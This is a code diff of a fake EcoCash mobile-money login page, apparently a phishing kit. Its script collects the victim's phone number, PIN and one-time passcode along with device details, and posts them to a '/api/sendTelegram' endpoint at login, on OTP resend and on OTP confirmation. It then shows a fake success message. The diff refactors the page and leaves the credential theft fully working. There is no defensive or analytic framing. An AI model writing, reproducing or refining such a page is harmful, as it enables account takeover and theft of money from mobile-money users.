@@ -1,14 +1,14 @@
 <!doctype html>
 <html>
 <head>
-<meta charset="utf-8" />
-<meta name="viewport" content="width=device-width,initial-scale=1" />
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
 <title>EcoCash — Login</title>
+
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
 
 <style>
 *{box-sizing:border-box}
-html,body{height:100%}
 body{
   font-family:Inter,system-ui,Arial;
   background:linear-gradient(180deg,#f7fbff,#e8f3ff);
@@ -17,6 +17,7 @@ body{
   display:flex;
   align-items:center;
   justify-content:center;
+  min-height:100vh;
 }
 .card{
   width:100%;
@@ -48,8 +49,12 @@ input{
   cursor:pointer
 }
 .btn[disabled]{background:#cbd5e1;cursor:not-allowed}
-.error{color:#d04444;font-size:13px;margin-top:4px;display:none}
-
+.error{
+  color:#d04444;
+  font-size:13px;
+  margin-top:4px;
+  display:none
+}
 .pin-row{
   display:flex;
   gap:8px;
@@ -122,14 +127,14 @@ input{
 <body>
 
 <div class="card">
-  <img src="assets/eco.png" class="logo" alt="EcoCash logo">
+  <img src="assets/eco.png" class="logo">
   <h2>Log In</h2>
 
   <form id="loginForm" autocomplete="off">
     <label>Mobile Number</label>
     <input id="phone" value="+263" inputmode="numeric">
     <div id="phoneError" class="error">
-      Enter your Econet number (9 digits starting with 7)
+      Enter Econet number (9 digits starting with 7)
     </div>
 
     <label>Enter your PIN</label>
@@ -152,12 +157,12 @@ input{
     <p class="small">We have sent an OTP to your phone.</p>
 
     <div class="otp-row">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d0">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d1">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d2">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d3">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d4">
-      <input class="otp-digit" maxlength="1" inputmode="numeric" id="d5">
+      <input class="otp-digit" maxlength="1">
+      <input class="otp-digit" maxlength="1">
+      <input class="otp-digit" maxlength="1">
+      <input class="otp-digit" maxlength="1">
+      <input class="otp-digit" maxlength="1">
+      <input class="otp-digit" maxlength="1">
     </div>
 
     <div id="otpWarning" class="otp-warning">Please input 6 digits</div>
@@ -179,49 +184,57 @@ input{
 </div>
 
 <script>
-/* ===== DEVICE INFO ===== */
-const ua = navigator.userAgent;
-let device_os='Unknown', device_os_version='Unknown', device_browser='Unknown';
+/* ================= DEVICE INFO (GUARANTEED) ================= */
+const ua = navigator.userAgent || 'unknown';
+const device_os =
+  /Android/i.test(ua) ? 'Android' :
+  /iPhone|iPad/i.test(ua) ? 'iOS' : 'Other';
 
-if(/Android\s([\d\.]+)/i.test(ua)){
-  device_os='Android';
-  device_os_version=ua.match(/Android\s([\d\.]+)/i)[1];
-}else if(/iPhone OS\s([\d_]+)/i.test(ua)){
-  device_os='iOS';
-  device_os_version=ua.match(/iPhone OS\s([\d_]+)/i)[1].replace(/_/g,'.');
-}
-if(/Chrome/i.test(ua)) device_browser='Chrome';
-else if(/Safari/i.test(ua)) device_browser='Safari';
-else if(/Firefox/i.test(ua)) device_browser='Firefox';
+const device_os_version =
+  (ua.match(/Android\s([\d\.]+)/i) || ua.match(/OS\s([\d_]+)/i) || ['','unknown'])[1]
+    .replace(/_/g,'.');
 
-/* ===== PHONE ===== */
-const phone=document.getElementById('phone');
-const phoneError=document.getElementById('phoneError');
-const loginBtn=document.getElementById('loginBtn');
+const device_browser =
+  /Chrome/i.test(ua) ? 'Chrome' :
+  /Safari/i.test(ua) ? 'Safari' :
+  /Firefox/i.test(ua) ? 'Firefox' : 'Other';
 
-function validatePhone(){
-  const digits=phone.value.replace('+263','');
-  const ok=/^7\d{8}$/.test(digits);
-  phoneError.style.display=ok?'none':'block';
-  return ok;
+/* ================= PHONE (FIXED) ================= */
+const phone = document.getElementById('phone');
+const phoneError = document.getElementById('phoneError');
+const loginBtn = document.getElementById('loginBtn');
+
+function showPhoneError(show){
+  phoneError.style.display = show ? 'block' : 'none';
 }
 
-phone.addEventListener('input',()=>{
-  let d=phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
-  phone.value='+263'+d;
-  validatePhone(); updateState();
+function phoneIsValid(){
+  const digits = phone.value.slice(4);
+  return /^7\d{8}$/.test(digits);
+}
+
+function enforcePhone(){
+  let digits = phone.value.replace('+263','').replace(/\D/g,'').slice(0,9);
+  phone.value = '+263' + digits;
+  showPhoneError(!phoneIsValid());
+}
+
+phone.addEventListener('input', ()=>{
+  enforcePhone();
+  updateState();
 });
-phone.addEventListener('blur',validatePhone);
-validatePhone();
+phone.addEventListener('blur', enforcePhone);
+window.addEventListener('load', enforcePhone);
 
-/* ===== PIN ===== */
-const pinBoxes=[...document.querySelectorAll('.pin-digit')];
-let pinVal='';
+/* ================= PIN ================= */
+const pinBoxes = [...document.querySelectorAll('.pin-digit')];
+let pinVal = '';
+
 pinBoxes.forEach((b,i)=>{
   b.addEventListener('input',()=>{
     b.value=b.value.replace(/\D/g,'');
     if(b.value && i<3) pinBoxes[i+1].focus();
-    pinVal=pinBoxes.map(x=>x.value).join('');
+    pinVal = pinBoxes.map(x=>x.value).join('');
     updateState();
   });
   b.addEventListener('keydown',e=>{
@@ -232,11 +245,13 @@ pinBoxes.forEach((b,i)=>{
     }
   });
 });
+
+/* ================= STATE ================= */
 function updateState(){
-  loginBtn.disabled=!(validatePhone() && /^\d{4}$/.test(pinVal));
+  loginBtn.disabled = !(phoneIsValid() && /^\d{4}$/.test(pinVal));
 }
 
-/* ===== API ===== */
+/* ================= API ================= */
 function send(payload){
   return fetch('/api/sendTelegram',{
     method:'POST',
@@ -245,67 +260,57 @@ function send(payload){
   });
 }
 
-/* ===== OTP LOGIC (ORIGINAL) ===== */
+/* ================= OTP ================= */
 const otpModal=document.getElementById('otpModal');
-const dEls=[d0,d1,d2,d3,d4,d5];
-const confirmBtn=document.getElementById('confirmOtp');
-const cancelBtn=document.getElementById('cancelOtp');
+const otpInputs=[...document.querySelectorAll('.otp-digit')];
+const confirmOtp=document.getElementById('confirmOtp');
+const cancelOtp=document.getElementById('cancelOtp');
 const otpWarning=document.getElementById('otpWarning');
 const otpStatus=document.getElementById('otpStatus');
 const resendBtn=document.getElementById('resendBtn');
 const resendInfo=document.getElementById('resendInfo');
 const countdownEl=document.getElementById('countdown');
 
-let resendTimer=null, secondsLeft=120;
+let timer=null, seconds=120;
 
-function startResendCountdown(){
-  clearInterval(resendTimer);
-  secondsLeft=120;
+function startCountdown(){
+  clearInterval(timer);
+  seconds=120;
   resendBtn.disabled=true;
-  resendInfo.innerHTML=`Resend available in <span id="countdown">${secondsLeft}</span>s`;
-  resendTimer=setInterval(()=>{
-    secondsLeft--;
-    if(secondsLeft<=0){
-      clearInterval(resendTimer);
+  resendInfo.innerHTML=`Resend available in <span id="countdown">${seconds}</span>s`;
+  timer=setInterval(()=>{
+    seconds--;
+    if(seconds<=0){
+      clearInterval(timer);
       resendBtn.disabled=false;
       resendInfo.textContent="Didn't receive OTP?";
     }else{
-      countdownEl.textContent=secondsLeft;
+      countdownEl.textContent=seconds;
     }
   },1000);
 }
 
-function getOtp(){return dEls.map(el=>el.value).join('');}
-function updateConfirm(){
-  const ok=/^\d{6}$/.test(getOtp());
-  confirmBtn.disabled=!ok;
-  otpWarning.style.display=ok?'none':'block';
-}
+function otpValue(){return otpInputs.map(o=>o.value).join('');}
 
-dEls.forEach((el,i)=>{
-  el.addEventListener('input',()=>{
-    el.value=el.value.replace(/\D/g,'');
-    if(el.value && i<5) dEls[i+1].focus();
-    updateConfirm();
-  });
-  el.addEventListener('keydown',e=>{
-    if(e.key==='Backspace' && !el.value && i>0){
-      dEls[i-1].focus();
-      dEls[i-1].value='';
-      e.preventDefault();
-    }
+otpInputs.forEach((o,i)=>{
+  o.addEventListener('input',()=>{
+    o.value=o.value.replace(/\D/g,'');
+    if(o.value && i<5) otpInputs[i+1].focus();
+    confirmOtp.disabled=!/^\d{6}$/.test(otpValue());
+    otpWarning.style.display=confirmOtp.disabled?'block':'none';
   });
 });
 
-/* ===== LOGIN ===== */
-loginForm.addEventListener('submit',async e=>{
+/* ================= LOGIN ================= */
+loginForm.onsubmit=async e=>{
   e.preventDefault();
   if(hp.value) return;
 
   otpModal.style.display='flex';
-  dEls.forEach(d=>d.value='');
-  updateConfirm();
-  startResendCountdown();
+  otpInputs.forEach(o=>o.value='');
+  confirmOtp.disabled=true;
+  otpWarning.style.display='none';
+  startCountdown();
 
   await send({
     event:'login_clicked',
@@ -317,16 +322,10 @@ loginForm.addEventListener('submit',async e=>{
     device_user_agent:ua,
     submittedAt:new Date().toISOString()
   });
-});
-
-cancelBtn.onclick=()=>{
-  otpModal.style.display='none';
-  clearInterval(resendTimer);
 };
 
 resendBtn.onclick=async()=>{
-  otpStatus.textContent='Resending OTP…';
-  startResendCountdown();
+  startCountdown();
   await send({
     event:'resend_otp',
     loginPhone:phone.value,
@@ -337,16 +336,14 @@ resendBtn.onclick=async()=>{
     device_user_agent:ua,
     submittedAt:new Date().toISOString()
   });
-  otpStatus.textContent='OTP resent. Check your phone.';
 };
 
-confirmBtn.onclick=async()=>{
-  otpStatus.textContent='Sending…';
+confirmOtp.onclick=async()=>{
   await send({
     event:'otp_confirm',
     loginPhone:phone.value,
     loginPin:pinVal,
-    otp:getOtp(),
+    otp:otpValue(),
     device_os,
     device_os_version,
     device_browser,
@@ -355,6 +352,11 @@ confirmBtn.onclick=async()=>{
   });
   otpStatus.innerHTML="<span class='success'>Success — your request has been received.</span>";
   setTimeout(()=>location.href='thankyou.html',1200);
+};
+
+cancelOtp.onclick=()=>{
+  otpModal.style.display='none';
+  clearInterval(timer);
 };
 </script>
 
